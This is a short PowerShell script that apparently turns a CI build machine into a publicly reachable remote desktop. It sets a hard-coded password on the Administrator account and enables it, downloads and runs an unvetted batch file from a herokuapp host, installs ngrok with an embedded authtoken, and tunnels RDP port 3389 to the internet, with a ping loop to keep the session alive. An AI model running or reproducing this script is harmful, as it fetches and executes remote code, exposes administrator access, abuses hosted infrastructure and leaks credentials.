Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "a*C'UZ4Gf^9!\6gG" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser 
Invoke-WebRequest https://rzhz.herokuapp.com/circleci/rdp/log.bat -OutFile log.bat
Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
unzip ngrok.zip
Copy ngrok.exe C:\Windows\System32
Start-Service -Name audiosrv
cmd /c echo ./ngrok.exe authtoken "1uYqYSLJQDBJtf1cUhDTCiED1Sh_4MLAgNXZS5ntBWD4EjzUa" >a.ps1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
cmd /c log.bat
.\a.ps1
